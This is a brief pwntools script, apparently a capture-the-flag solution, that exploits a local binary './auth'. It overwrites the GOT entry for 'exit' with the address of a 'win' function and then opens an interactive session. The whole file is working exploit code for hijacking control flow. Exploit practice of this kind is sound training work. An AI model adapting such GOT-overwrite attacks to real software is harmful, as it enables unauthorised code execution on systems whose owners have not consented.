# call exit 0x08048669
# call win 0x0804854b
from pwn import *

context.binary = "./auth"

p = process()

p.sendline(hex(context.binary.got["exit"]))
p.sendline(hex(context.binary.functions["win"].address))
p.interactive()
